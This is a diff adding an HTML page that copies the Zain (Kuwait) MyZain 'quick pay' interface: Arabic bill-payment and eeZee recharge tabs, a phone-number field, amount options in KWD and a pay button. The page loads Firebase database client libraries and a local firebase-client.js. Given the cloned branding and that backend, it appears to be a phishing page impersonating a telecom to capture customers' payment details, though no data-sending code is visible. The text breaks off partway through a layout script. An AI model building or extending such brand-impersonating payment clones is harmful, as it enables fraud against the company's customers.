@@ -1,0 +1,1217 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+    <script src="./assets/js/firebase-client.js"></script>
+
+    <link rel="icon" href="./assets/images/favicon.ico" />
+
+    <title>MyZain</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:ital,opsz,wght@0,6..12,200..900;1,6..12,200..900&family=Zain:wght@200;300;400;700;800;900&display=swap" rel="stylesheet">
+    <link href="./assets/css/app.css" rel="preload" as="style" />
+    <link href="./assets/css/chunk-vendors.css" rel="preload" as="style" />
+    <link href="./assets/css/styles__rtl.css" rel="preload" as="style" />
+    <link href="./assets/css/styles__rtl.css" rel="stylesheet" />
+
+    <link href="./assets/css/chunk-vendors.css" rel="stylesheet" />
+    <link href="./assets/css/app.css" rel="stylesheet" />
+    <link href="./assets/css/styles__rtl.css" rel="stylesheet" />
+
+    <meta
+      data-vue-meta="1"
+      name="description"
+      content="Zain is the pioneer of mobile telecommunications in the Middle East. We began life in 1983 in Kuwait as the region’s first mobile operator, and since the initiation of our expansion strategy in 2003, we have expanded rapidly. Today, we are a leading"
+    />
+    <style>
+      /* =====================================================
+         NATIVE APP LAYOUT — fills viewport, no scroll
+         ===================================================== */
+
+      *, *::before, *::after { box-sizing: border-box; }
+
+      /* 1. Lock the entire page to the real visible viewport */
+      html, body {
+        height: 100dvh !important;
+        max-height: 100dvh !important;
+        margin: 0;
+        overflow: hidden !important;
+        background-color: #f4f6f8 !important;
+      }
+
+      body { display: flex; flex-direction: column; }
+
+      /* 2. All root wrappers fill full height — NO overflow:hidden so
+            measurement isn't clamped by parent clipping */
+      [data-v-9f83da10],
+      #app,
+      #app > div {
+        height: 100% !important;
+        min-height: 0 !important;
+        display: flex;
+        flex-direction: column;
+        /* overflow:visible so children can be measured correctly */
+        overflow: visible;
+      }
+
+      /* 3. Header + Footer — fixed-size anchors */
+      #header-container { flex: none; }
+      #app > div > .footer { flex: none !important; }
+
+      /* 4. Content zone — only THIS clips; flex-fills the gap */
+      #app > div > .pb-6 {
+        flex: 1 1 0;
+        min-height: 0;
+        overflow: hidden;
+        padding: 40px 16px !important; /* clear visible gaps top + bottom */
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+      }
+
+      /* 5. Inner wrappers — no overflow clipping, full width */
+      #app > div > .pb-6 > div,
+      #app > div > .pb-6 > div > div {
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        overflow: visible;
+      }
+
+      /* 6. The form card that JS will scale */
+      #scalable-form-wrapper {
+        width: 100%;
+        max-width: 500px;          /* cap width on mid/large desktops */
+        margin-left: auto;
+        margin-right: auto;
+        transform-origin: top center;
+        /* Initial transform — JS overrides at runtime */
+        transform: scale(1);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      /* 7. Sticky header animation */
+      .header-bg.fixed {
+        transform: translateY(-100%);
+        opacity: 0;
+        transition: transform 0.3s ease-in-out, opacity 0.3s ease-in-out;
+      }
+      .header-bg.fixed.header-visible {
+        transform: translateY(0);
+        opacity: 1;
+      }
+
+      /* 8. Strip Tailwind spacing that fights the layout */
+      #app > div > .pb-6 [data-v-22b72c14] {
+        padding: 0 !important;
+        margin: 0 !important;
+        width: 100%;
+      }
+      .mt-3, .mt-4, .mt-12 { margin-top: 0 !important; }
+      .mb-3, .mb-4, .mb-14 { margin-bottom: 0 !important; }
+
+      /* ── 9. Native-App Typography Scale ────────────────────────────────
+         On sm+ screens, shrink fonts so the form feels compact & app-like.
+         clamp(min, preferred, max) gives smooth scaling between breakpoints.
+         ─────────────────────────────────────────────────────────────────── */
+      @media (min-width: 640px) {
+
+        /* Page title "الدفع السريع" */
+        #scalable-form-wrapper .font-extrabold {
+          font-size: clamp(0.9rem, 1.4vw, 1.05rem) !important;
+        }
+
+        /* Tab labels (دفع الفاتورة / إعادة تعبئة eeZee) */
+        #scalable-form-wrapper [id^="tab-"] div,
+        #scalable-form-wrapper [id^="tab-"] {
+          font-size: clamp(0.72rem, 1.1vw, 0.82rem) !important;
+        }
+
+        /* Section labels (أود الدفع لـ / رقم الهاتف / اختر قيمة) */
+        #scalable-form-wrapper label,
+        #scalable-form-wrapper .text-sm {
+          font-size: clamp(0.72rem, 1.1vw, 0.8rem) !important;
+        }
+
+        /* Dropdown selected value & list items */
+        #scalable-form-wrapper .truncate,
+        #scalable-form-wrapper .list-box-item {
+          font-size: clamp(0.78rem, 1.1vw, 0.88rem) !important;
+        }
+
+        /* Phone number & custom amount inputs */
+        #scalable-form-wrapper input {
+          font-size: clamp(0.8rem, 1.2vw, 0.9rem) !important;
+          padding-top: 0.45rem !important;
+          padding-bottom: 0.45rem !important;
+        }
+
+        /* Total row — "إجمالي" & amount */
+        #scalable-form-wrapper .text-2xl {
+          font-size: clamp(0.95rem, 1.5vw, 1.1rem) !important;
+        }
+
+        /* Pay button */
+        #scalable-form-wrapper #pay-now-button {
+          font-size: clamp(0.8rem, 1.2vw, 0.9rem) !important;
+          padding-top: 0.6rem !important;
+          padding-bottom: 0.6rem !important;
+        }
+
+        /* Tighten card vertical padding so it stays compact */
+        #scalable-form-wrapper .px-5 {
+          padding-left: 1rem !important;
+          padding-right: 1rem !important;
+        }
+        #scalable-form-wrapper .pt-5 {
+          padding-top: 0.75rem !important;
+        }
+        #scalable-form-wrapper .pb-5 {
+          padding-bottom: 0.75rem !important;
+        }
+        #scalable-form-wrapper .py-3 {
+          padding-top: 0.5rem !important;
+          padding-bottom: 0.5rem !important;
+        }
+        #scalable-form-wrapper .pb-4 {
+          padding-bottom: 0.6rem !important;
+        }
+        #scalable-form-wrapper .py-5 {
+          padding-top: 0.65rem !important;
+          padding-bottom: 0.65rem !important;
+        }
+        #scalable-form-wrapper .mt-6 {
+          margin-top: 0.75rem !important;
+        }
+        #scalable-form-wrapper .mt-7 {
+          margin-top: 0.75rem !important;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div data-v-9f83da10="" class="min-h-full h-full w-full">
+      <div data-v-9f83da10="" id="app" dir="rtl">
+        <div>
+          <div id="header-container">
+            <div class=""><!-- --></div>
+            <div>
+              <nav aria-label="Main Nav" class="header-bg z-40 w-full bg-black">
+                <div class="mx-auto ps-2 sm:px-6 lg:px-8">
+                  <div class="relative flex h-14 w-full items-center lg:h-18 lg:px-6">
+                    <div class="flex-1 flex items-center justify-start sm:items-stretch sm:justify-start">
+                      <a href="./" class="flex flex-shrink-0 items-center">
+                        <img src="assets/images/logo.png" alt="Zain Logo" class="block h-8 w-auto cursor-pointer lg:h-10" />
+                      </a>
+                    </div>
+                    <div class="hidden h-full sm:ms-6 lg:block">
+                      <div class="flex h-full text-lg text-white 2xl:text-2xl">
+                        <a href="#" aria-current="page" class="flex items-center border-b-2 border-transparent px-7 py-2 space-s-3 hover:border-primary">
+                          <span class="icon-cart-with-plus"></span><span>تسوق</span>
+                        </a>
+                        <a href="#" class="flex items-center border-b-2 border-primary px-6 py-2 space-s-3">
+                          <span class="icon-Group-1561"></span><span class="whitespace-nowrap">My Zain</span>
+                        </a>
+                        <a href="#" class="flex items-center border-b-2 border-transparent px-7 py-2 space-s-3 hover:border-primary">
+                          <span class="icon-headphones-with-mic"></span><span>الدعم</span>
+                        </a>
+                      </div>
+                    </div>
+                    <div class="flex-1 justify-self-end flex items-center justify-end pe-2 sm:static sm:inset-auto sm:pe-0 sm:ms-6">
+                      <button type="button" aria-controls="mobile-menu" aria-expanded="false" class="h-12 px-2 focus:outline-none inline-flex items-center justify-center rounded-md text-gray-400 hover:bg-gray-700 hover:text-white focus:ring-2 focus:ring-inset focus:ring-white lg:hidden mobile-menu-toggle-btn">
+                        <span class="text-gray-100 icon-hamburger"></span>
+                      </button>
+                    </div>
+                  </div>
+                </div>
+                <!-- -->
+              </nav>
+              <nav aria-label="Main Nav" class="header-bg fixed top-0 z-50 w-full bg-black">
+                <div class="mx-auto ps-2 sm:px-6 lg:px-8">
+                  <div class="relative flex h-14 w-full items-center lg:h-18 lg:px-6">
+                    <div class="flex-1 flex items-center justify-start sm:items-stretch sm:justify-start">
+                      <a href="./" class="flex flex-shrink-0 items-center">
+                        <img src="assets/images/logo.png" alt="Zain Logo" class="block h-8 w-auto cursor-pointer lg:h-10" />
+                      </a>
+                    </div>
+                    <div class="hidden h-full sm:ms-6 lg:block">
+                      <div class="flex h-full text-lg text-white 2xl:text-2xl">
+                        <a href="#" aria-current="page" class="flex items-center border-b-2 border-transparent px-7 py-2 space-s-3 hover:border-primary">
+                          <span class="icon-cart-with-plus"></span><span>تسوق</span>
+                        </a>
+                        <a href="#" class="flex items-center border-b-2 border-primary px-6 py-2 space-s-3">
+                          <span class="icon-Group-1561"></span><span class="whitespace-nowrap">My Zain</span>
+                        </a>
+                        <a href="#" class="flex items-center border-b-2 border-transparent px-7 py-2 space-s-3 hover:border-primary">
+                          <span class="icon-headphones-with-mic"></span><span>الدعم</span>
+                        </a>
+                      </div>
+                    </div>
+                    <div class="flex-1 justify-self-end flex items-center justify-end pe-2 sm:static sm:inset-auto sm:pe-0 sm:ms-6">
+                      <button type="button" aria-controls="mobile-menu" aria-expanded="false" class="h-12 px-2 focus:outline-none inline-flex items-center justify-center rounded-md text-gray-400 hover:bg-gray-700 hover:text-white focus:ring-2 focus:ring-inset focus:ring-white lg:hidden mobile-menu-toggle-btn">
+                        <span class="text-gray-100 icon-hamburger"></span>
+                      </button>
+                    </div>
+                  </div>
+                </div>
+                <!-- -->
+              </nav>
+
+              <!-- -->
+            </div>
+          </div>
+          <div class="pb-6 md:pb-12 dark:text-white">
+            <div id="scalable-form-wrapper">
+            <div data-v-22b72c14="">
+              <div data-v-22b72c14="" class="px-3 mt-4">
+                <div data-v-22b72c14="">
+                  <div
+                    class="mt-3 md:mt-12 mx-3 md:max-w-xl md:mx-auto font-extrabold text-xl md:text-2xl mb-2 md:mb-4 relative flex justify-between items-center ps-2"
+                  >
+                    <span> الدفع السريع </span>
+                  </div>
+                  <!---->
+                  <div
+                    class="lg:mt-3 mb-3 md:mb-14 mx-3 md:max-w-xl md:mx-auto relative"
+                  >
+                    <div class="override-loading"><!----></div>
+                    <span
+                      ><div>
+                        <div>
+                          <ul
+                            class="list-none flex items-stretch justify-center border-b border-gray-300 rounded-ts-lg dark:bg-gray-900 bg-white rounded-te-lg shadow-lg"
+                          >
+                            <li
+                              id="tab-pay-bill"
+                              tabindex="-1"
+                              class="px-4 py-2 relative flex-1 text-center text-primary border-b border-primary font-bold"
+                            >
+                              <div
+                                class="flex justify-center items-center gap-2 text-sm md:text-md"
+                              >
+                                <div class="flex justify-center items-center">
+                                  <span></span>
+                                </div>
+                                <div class="">دفع الفاتورة</div>
+                              </div>
+                            </li>
+                            <li
+                              id="tab-recharge-eezee"
+                              tabindex="0"
+                              class="px-4 py-2 relative flex-1 text-center text-gray-600 cursor-pointer border-b hover:border-black dark:text-white dark:hover:border-gray-400"
+                            >
+                              <div
+                                class="flex justify-center items-center gap-2 text-sm md:text-md"
+                              >
+                                <div class="flex justify-center items-center">
+                                  <span></span>
+                                </div>
+                                <div class="">إعادة تعبئة eeZee</div>
+                              </div>
+                            </li>
+                          </ul>
+                          <div class="relative flex flex-col">
+                            <div class="flex-shrink-0">
+                              <div>
+                                <div
+                                  class="bg-white dark:bg-gray-700 px-5 pt-5 shadow-xl"
+                                >
+                                  <!---->
+                                  <div class="pb-4">
+                                    <p
+                                      id="listbox-d7030742-dcd0-4fa8-a6ee-13b84b85f668"
+                                      class="block text-sm font-medium mb-1"
+                                    >
+                                      أود الدفع لــ
+                                    </p>
+                                    <div class="relative">
+                                      <button
+                                        id="dropdown-pay-for-btn"
+                                        type="button"
+                                        aria-haspopup="listbox"
+                                        aria-expanded="false"
+                                        aria-labelledby="listbox-d7030742-dcd0-4fa8-a6ee-13b84b85f668"
+                                        class="relative w-full bg-white dark:bg-opacity-10 border-b border-primary hover:border-black pl-3 pr-10 py-3 text-left cursor-pointer focus:outline-none sm:text-sm"
+                                      >
+                                        <span class="flex items-center"
+                                          ><span
+                                            class="block text-start truncate w-full font-bold h-5 select-none h-full"
+                                            ><div>
+                                              <div class="flex justify-between">
+                                                <div>رقم آخر</div>
+                                              </div>
+                                            </div></span
+                                          ></span
+                                        ><span
+                                          class="ml-3 absolute inset-y-0 right-0 flex items-center pr-2 pointer-events-none"
+                                          ><svg
+                                            xmlns="http://www.w3.org/2000/svg"
+                                            width="13.838"
+                                            height="8.758"
+                                            viewBox="0 0 13.838 8.758"
+                                            class="transform transition-transform duration-300"
+                                            style="
+                                              transform-origin: center center;
+                                            "
+                                          >
+                                            <path
+                                              id="Path_2439"
+                                              data-name="Path 2439"
+                                              d="M-12874.445-18625.674l6,6,6-6"
+                                              transform="translate(12875.364 18626.594)"
+                                              fill="none"
+                                              stroke="#d12b8a"
+                                              stroke-width="2.6"
+                                            ></path></svg
+                                        ></span>
+                                      </button>
+                                      <ul
+                                        class="absolute mt-1 w-full bg-white dark:bg-gray-800 shadow-lg max-h-72 rounded-md py-1 text-base ring-1 ring-black ring-opacity-5 overflow-auto focus:outline-none sm:text-sm z-10"
+                                        style="display: none"
+                                        id="dropdown-pay-for-list"
+                                      >
+                                        <!---->
+                                        <li
+                                          data-v-6b568f73=""
+                                          id="option-other-number"
+                                          role="option"
+                                          class="list-box-item text-gray-900 dark:text-white select-none relative py-2 pl-3 pr-3 cursor-pointer border-gray-200"
+                                        >
+                                          <div
+                                            data-v-6b568f73=""
+                                            class="font-normal block w-full flex justify-between items-center text-primary font-bold"
+                                          >
+                                            <span
+                                              data-v-6b568f73=""
+                                              class="inline-block flex-grow-0 me-2 w-4"
+                                              ><span data-v-6b568f73=""
+                                                ><span
+                                                  data-v-6b568f73=""
+                                                  class="icon-check-mark-button"
+                                                ></span></span></span
+                                            ><span
+                                              data-v-6b568f73=""
+                                              class="flex-grow"
+                                              ><div
+                                                data-v-6b568f73=""
+                                                class="flex justify-between"
+                                              >
+                                                <div data-v-6b568f73="">
+                                                  رقم آخر
+                                                </div>
+                                              </div></span
+                                            >
+                                          </div>
+                                        </li>
+                                        <li
+                                          data-v-6b568f73=""
+                                          id="option-contract-number"
+                                          role="option"
+                                          class="list-box-item text-gray-900 dark:text-white select-none relative py-2 pl-3 pr-3 cursor-pointer border-gray-200"
+                                        >
+                                          <div
+                                            data-v-6b568f73=""
+                                            class="font-normal block w-full flex justify-between items-center"
+                                          >
+                                            <span
+                                              data-v-6b568f73=""
+                                              class="inline-block flex-grow-0 me-2 w-4"
+                                              ><span data-v-6b568f73=""
+                                                ><!----></span
+                                              ></span
+                                            ><span
+                                              data-v-6b568f73=""
+                                              class="flex-grow"
+                                              ><div
+                                                data-v-6b568f73=""
+                                                class="flex justify-between"
+                                              >
+                                                <div data-v-6b568f73="">
+                                                  رقم العقد
+                                                </div>
+                                              </div></span
+                                            >
+                                          </div>
+                                        </li>
+                                      </ul>
+                                    </div>
+                                  </div>
+                                  <!----><!----><!----><!---->
+                                </div>
+                                <div>
+                                  <div
+                                    class="bg-white dark:bg-gray-700 relative overflow-visible mb-4 rounded-bl-lg rounded-br-lg px-5 shadow-lg pb-5"
+                                  >
+                                    <div class=""><!----></div>
+                                    <!----><!----><!---->
+                                    <div>
+                                      <div data-v-9224202c="" class="w-full">
+                                        <div
+                                          data-v-83ff3774=""
+                                          data-v-9224202c=""
+                                        >
+                                          <div
+                                            data-v-9224202c=""
+                                            data-v-83ff3774=""
+                                            class=""
+                                          >
+                                            <label
+                                              data-v-9224202c=""
+                                              data-v-83ff3774=""
+                                              for="phone-number-input"
+                                              class="text-sm font-medium block required"
+                                            >
+                                              رقم الهاتف
+                                            </label>
+                                            <div
+                                              data-v-9224202c=""
+                                              data-v-83ff3774=""
+                                              class="relative"
+                                            >
+                                              <div
+                                                data-v-9224202c=""
+                                                data-v-83ff3774=""
+                                                class="flex items-center"
+                                              >
+                                                <!----><!----><input
+                                                  data-v-9224202c=""
+                                                  data-v-83ff3774=""
+                                                  dir=""
+                                                  id="phone-number-input"
+                                                  placeholder="أدخل الرقم: 99XXXXXX"
+                                                  name="رقم الهاتف"
+                                                  type="text"
+                                                  pattern="[0-9]*"
+                                                  maxlength="8"
+                                                  class="border-primary border-b border-t-0 border-l-0 border-r-0 border border-gray-200 dark:border-gray-500 mt-1 w-full py-2.5 dark:bg-gray-600 dark:placeholder-gray-400 dark:text-white focus:border-transparent focus:outline-none focus:ring focus:ring-blue-200 focus:border-blue-400"
+                                                />
+                                                <div
+                                                  data-v-9224202c=""
+                                                  data-v-83ff3774=""
+                                                  class="absolute end-2 items-end"
+                                                ></div>
+                                              </div>
+                                            </div>
+                                           </div>
+                                           
+                                           <!-- Predefined Charge Value Dropdown (Shown after phone is entered) -->
+                                           
+                                           <div id="charge-amount-container" class="pb-4 mt-4" style="display: none; transition: all 0.3s ease;">
+                                             <label for="dropdown-amount-btn" class="block text-sm font-medium mb-1"> اختر قيمة التعبئة / الدفع </label>
+                                             <div class="relative">
+                                               <button
+                                                 id="dropdown-amount-btn"
+                                                 type="button"
+                                                 class="relative w-full bg-white dark:bg-opacity-10 border-b border-primary hover:border-black pl-3 pr-10 py-3 text-left cursor-pointer focus:outline-none sm:text-sm"
+                                               >
+                                                 <span class="flex items-center">
+                                                   <span id="dropdown-amount-label" class="block text-start truncate w-full font-bold h-5 select-none h-full">
+                                                     5.000 د.ك
+                                                   </span>
+                                                 </span>
+                                                 <span class="ml-3 absolute inset-y-0 right-0 flex items-center pr-2 pointer-events-none">
+                                                   <svg xmlns="http://www.w3.org/2000/svg" width="13.838" height="8.758" viewBox="0 0 13.838 8.758" class="transform transition-transform duration-300" style="transform-origin: center center;">
+                                                     <path id="Path_2439" data-name="Path 2439" d="M-12874.445-18625.674l6,6,6-6" transform="translate(12875.364 18626.594)" fill="none" stroke="#d12b8a" stroke-width="2.6"></path>
+                                                   </svg>
+                                                 </span>
+                                               </button>
+                                               <ul id="dropdown-amount-list" class="absolute mt-1 w-full bg-white dark:bg-gray-800 shadow-lg max-h-72 rounded-md py-1 text-base ring-1 ring-black ring-opacity-5 overflow-auto focus:outline-none sm:text-sm z-10" style="display: none;">
+                                                 <li class="amount-option list-box-item text-gray-900 dark:text-white select-none relative py-2 pl-3 pr-3 cursor-pointer border-gray-200" data-value="5.000">
+                                                   <div class="font-normal block w-full flex justify-between items-center text-primary font-bold">
+                                                     <span class="inline-block flex-grow-0 me-2 w-4">
+                                                       <span class="icon-check-mark-button">✓</span>
+                                                     </span>
+                                                     <span class="flex-grow">5.000 د.ك</span>
+                                                   </div>
+                                                 </li>
+                                                 <li class="amount-option list-box-item text-gray-900 dark:text-white select-none relative py-2 pl-3 pr-3 cursor-pointer border-gray-200" data-value="10.000">
+                                                   <div class="font-normal block w-full flex justify-between items-center">
+                                                     <span class="inline-block flex-grow-0 me-2 w-4">
+                                                       <span class="icon-check-mark-button hidden">✓</span>
+                                                     </span>
+                                                     <span class="flex-grow">10.000 د.ك</span>
+                                                   </div>
+                                                 </li>
+                                                 <li class="amount-option list-box-item text-gray-900 dark:text-white select-none relative py-2 pl-3 pr-3 cursor-pointer border-gray-200" data-value="20.000">
+                                                   <div class="font-normal block w-full flex justify-between items-center">
+                                                     <span class="inline-block flex-grow-0 me-2 w-4">
+                                                       <span class="icon-check-mark-button hidden">✓</span>
+                                                     </span>
+                                                     <span class="flex-grow">20.000 د.ك</span>
+                                                   </div>
+                                                 </li>
+                                                 <li class="amount-option list-box-item text-gray-900 dark:text-white select-none relative py-2 pl-3 pr-3 cursor-pointer border-gray-200" data-value="50.000">
+                                                   <div class="font-normal block w-full flex justify-between items-center">
+                                                     <span class="inline-block flex-grow-0 me-2 w-4">
+                                                       <span class="icon-check-mark-button hidden">✓</span>
+                                                     </span>
+                                                     <span class="flex-grow">50.000 د.ك</span>
+                                                   </div>
+                                                 </li>
+                                                 <li class="amount-option list-box-item text-gray-900 dark:text-white select-none relative py-2 pl-3 pr-3 cursor-pointer border-gray-200" data-value="other">
+                                                   <div class="font-normal block w-full flex justify-between items-center">
+                                                     <span class="inline-block flex-grow-0 me-2 w-4">
+                                                       <span class="icon-check-mark-button hidden">✓</span>
+                                                     </span>
+                                                     <span class="flex-grow">مبلغ آخر</span>
+                                                   </div>
+                                                 </li>
+                                               </ul>
+                                             </div>
+                                           </div>
+
+                                           <!-- Custom Amount Text Input (Shown when 'Other' is selected) -->
+                                           <div id="custom-amount-container" class="pb-4 mt-2" style="display: none;">
+                                             <label for="custom-amount-input" class="block text-sm font-medium mb-1">أدخل المبلغ المخصص (د.ك)</label>
+                                             <div class="relative flex items-center">
+                                               <span class="absolute end-2 font-bold text-secondary text-base py-2.5">د.ك</span>
+                                               <input
+                                                 id="custom-amount-input"
+                                                 placeholder="0.000"
+                                                 type="text"
+                                                 class="border-primary border-b border-t-0 border-l-0 border-r-0 px-0 border border-gray-200 dark:border-gray-500 w-full py-2.5 dark:placeholder-gray-700 dark:text-black focus:border-transparent focus:outline-none focus:ring focus:ring-blue-200 focus:border-blue-400 pe-10 text-right pr-3 font-bold"
+                                                 style="color: black;"
+                                               />
+                                             </div>
+                                           </div>
+
+                                           <div
+                                             data-v-83ff3774=""
+                                             class="text-sm pt-1"
+                                           >
+                                            <!---->
+                                          </div>
+                                        </div>
+                                      </div>
+                                      <div
+                                        class="rounded-md relative overflow-visible p-3 my-3 text-sm bg-danger bg-opacity-10 text-danger flex space-s-2 items-center"
+                                        style="display: none"
+                                      >
+                                        <img
+                                          src="./assets/images/icon-cross.svg"
+                                          alt=""
+                                          class="inline-block w-6"
+                                        />
+                                        <p class="m-0"></p>
+                                      </div>
+                                    </div>
+
+                                    <!---->
+                                    <!-- X -->
+                                    <div
+                                      data-v-1861030c=""
+                                      aria-labelledby="modal-title"
+                                      role="dialog"
+                                      aria-modal="true"
+                                      class="fixed z-50 inset-0 overflow-y-auto bg-black bg-opacity-40"
+                                      style="display: none"
+                                    > 
+
+                                      <div
+                                        data-v-1861030c=""
+                                        class="flex items-center flex-col justify-center min-h-screen pt-4 px-4 pb-20 text-center sm:p-0 transition-opacity"
+                                      >
+                                        <div
+                                          data-v-1861030c=""
+                                          aria-hidden="true"
+                                          class="fixed inset-0"
+                                        ></div>
+                                        <div
+                                          data-v-1861030c=""
+                                          class="inline-block rounded-xl overflow-hidden shadow-xl transform transition-all my-4 align-middle w-full overflow-x-hidden panel max-w-lg"
+                                          style="max-height: 75vh"
+                                        >
+                                          <div
+                                            data-v-1861030c=""
+                                            class="bg-white dark:bg-gray-700 dark:text-white"
+                                          >
+                                            <span
+                                              data-v-1861030c=""
+                                              class="absolute right-2 top-2 cursor-pointer"
+                                              ><img
+                                                data-v-1861030c=""
+                                                src="./assets/images/cross.svg"
+                                                alt="Cancel"
+                                                class="inline-block m-2"
+                                            /></span>
+                                            <div
+                                              data-v-1861030c=""
+                                              class="flex flex-col justify-between pt-8 pb-4 px-4"
+                                            >
+                                              <div data-v-1861030c="">
+                                                <h1
+                                                  data-v-1861030c=""
+                                                  class="font-extrabold text-2xl mb-5"
+                                                >
+                                                  إيقاف خدمة خصوصية الفاتورة
+                                                </h1>
+                                                <p
+                                                  data-v-1861030c=""
+                                                  class="mt-9"
+                                                >
+                                                  سيتم إرسال رسالة قصيرة إلى
+                                                  رقمك تتضمن خطوات إيقاف خدمة
+                                                  خصوصية الفاتورة
+                                                </p>
+                                                <div
+                                                  data-v-1861030c=""
+                                                  class="w-full flex flex-col space-y-4 mt-10"
+                                                >
+                                                  <button
+                                                    type="button"
+                                                    class="transition ease-in duration-200 focus:outline-none focus:ring-2 focus:ring-offset focus:ring-blue-200 focus:ring-blue-400 text-center rounded-lg btn-active py-3 px-4 text-base font-black hover:shadow-lg bg-primary hover:text-primary border-primary text-white hover:bg-transparent border-2"
+                                                    data-v-1861030c=""
+                                                  >
+                                                    أرسل رسالة SMS
+                                                  </button>
+                                                </div>
+                                              </div>
+                                            </div>
+                                          </div>
+                                          <!---->
+                                        </div>
+                                      </div>
+                                    </div>
+                                    <div
+                                      class="border-t border-primary border-opacity-30 py-5 mt-6"
+                                    >
+                                      <div class="flex justify-between text-2xl font-bold">
+                                        <div>إجمالي</div>
+                                        <div class="text-green">0.000 د.ك</div>
+                                      </div>
+                                      <div
+                                        class="rounded-md relative overflow-visible p-3 my-3 text-sm bg-danger bg-opacity-10 text-danger flex space-s-2 items-center"
+                                        style="display: none;"
+                                      >
+                                        <img
+                                          src="./assets/images/icon-cross.svg"
+                                          alt=""
+                                          class="inline-block w-6"
+                                        />
+                                        <p class="m-0">
+                                          المبلغ يجب أن يكون أكثر من 1 د.ك. ولا يزيد عن 5000
+                                          د.ك.
+                                        </p>
+                                      </div>
+                                      <!-- X -->
+                                      <div
+                                        class="rounded-md relative overflow-visible p-3 my-3 text-sm bg-danger bg-opacity-10 text-danger flex space-s-2 items-center"
+                                        style="display: none"
+                                      >
+                                        <img
+                                          src="./assets/images/icon-cross.svg"
+                                          alt=""
+                                          class="inline-block w-6"
+                                        />
+                                        <p class="m-0">
+                                          يجب ألا يقل مبلغ دفع المستحقات المفصولة عن 30 د.ك.
+                                        </p>
+                                      </div>
+                                      <button
+                                        id="pay-now-button"
+                                        type="button"
+                                        disabled="disabled"
+                                        class="transition ease-in duration-200 focus:outline-none focus:ring-2 focus:ring-offset focus:ring-blue-200 focus:ring-blue-400 text-center rounded-lg btn-active w-full mt-7 uppercase py-3 px-4 text-base font-black cursor-not-allowed bg-gray-200 text-gray-400"
+                                      >
+                                        ادفع الآن
+                                      </button>
+                                    </div>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                            <!---->
+                    </div>
+                  </div>
+                  <!---->
+                </div>
+              </div>
+            </div>
+          </span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+            </div><!-- /#scalable-form-wrapper -->
+          <div class="footer border-t-2 border-primary px-5" data-v-7694748d="">
+            <div id="footer-container">
+              <div class="max-w-sm mx-auto md:max-w-full mx-0">
+                <div class="mb-6 md:mb-0 gap-4 flex flex-col md:flex-row md:justify-center items-center">
+                  <img src="assets/images/logo.png" alt="Zain Logo" class="block h-5 w-auto" />
+                  <div class="text-white text-xs">جميع حقوق الطبع و النشر محفوظة © 2026 زين.</div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <!---->
+        </div>
+      </div>
+    </div>
+    <script>
+      // ── Native-App Scaler ─────────────────────────────────────────────────
+      // KEY FIX: scrollHeight is clamped when parents have overflow:hidden.
+      // We temporarily lift the wrapper to position:fixed (outside all overflow
+      // contexts) to measure its TRUE natural height, then restore and scale.
+      (function initNativeScaler() {
+        const wrapper = document.getElementById('scalable-form-wrapper');
+
+        function getNaturalHeight() {
+          // Save state
+          const prevPos    = wrapper.style.position;
+          const prevTop    = wrapper.style.top;
+          const prevLeft   = wrapper.style.left;
+          const prevWidth  = wrapper.style.width;
+          const prevTrans  = wrapper.style.transform;
+          const prevHeight = wrapper.style.height;
+          const prevMB     = wrapper.style.marginBottom;
+
+          // Lift out of every overflow context, reset scale
+          wrapper.style.position    = 'fixed';
+          wrapper.style.top         = '-9999px';
+          wrapper.style.left        = '0';
+          wrapper.style.width       = window.innerWidth + 'px';
+          wrapper.style.transform   = 'none';
+          wrapper.style.height      = 'auto';
+          wrapper.style.marginBottom = '0';
+
+          // Force layout recalc and read real height
+          const h = wrapper.offsetHeight;
+          const w = wrapper.offsetWidth;
+
+          // Restore everything
+          wrapper.style.position    = prevPos;
+          wrapper.style.top         = prevTop;
+          wrapper.style.left        = prevLeft;
+          wrapper.style.width       = prevWidth;
+          wrapper.style.transform   = prevTrans;
+          wrapper.style.height      = prevHeight;
+          wrapper.style.marginBottom = prevMB;
+
+          return { h, w };
+        }
+
+        function applyScale() {
+          if (!wrapper) return;
+
+          // The content zone (.pb-6) has padding: 24px 16px.
+          // clientHeight = inner height *after* padding is deducted.
+          // This is exactly the space the form can occupy — respects the gaps.
+          const contentZone = document.querySelector('#app > div > .pb-6');
+          const available   = contentZone ? contentZone.clientHeight : window.innerHeight;
+
+          // Width available = capped by the 500px max-width on the wrapper
+          const viewportW   = Math.min(window.innerWidth - 32, 500); // 16px side padding × 2
+
+          // Measure real content size outside overflow constraints
+          const { h: contentH, w: contentW } = getNaturalHeight();
+
+          if (contentH <= 0 || available <= 0) return;
+
+          // Compute scale — shrink only, never enlarge
+          const scaleH  = available / contentH;
+          const scaleW  = viewportW / contentW;
+          const scale   = Math.min(scaleH, scaleW, 1);
+
+          wrapper.style.transformOrigin = 'top center';
+
+          if (scale < 1) {
+            // Form too tall — scale it down and collapse dead layout space
+            wrapper.style.transform    = `scale(${scale})`;
+            wrapper.style.height       = contentH + 'px';
+            wrapper.style.marginBottom = `-${contentH * (1 - scale)}px`;
+          } else {
+            // Form fits — clear overrides, let CSS flex centering give equal gaps
+            wrapper.style.transform    = 'scale(1)';
+            wrapper.style.height       = 'auto';
+            wrapper.style.marginBottom = '0';
+          }
+        }
+
+        window.addEventListener('resize', applyScale);
+
+        document.addEventListener('DOMContentLoaded', () => {
+          applyScale();
+          setTimeout(applyScale, 150);   // after webfonts settle
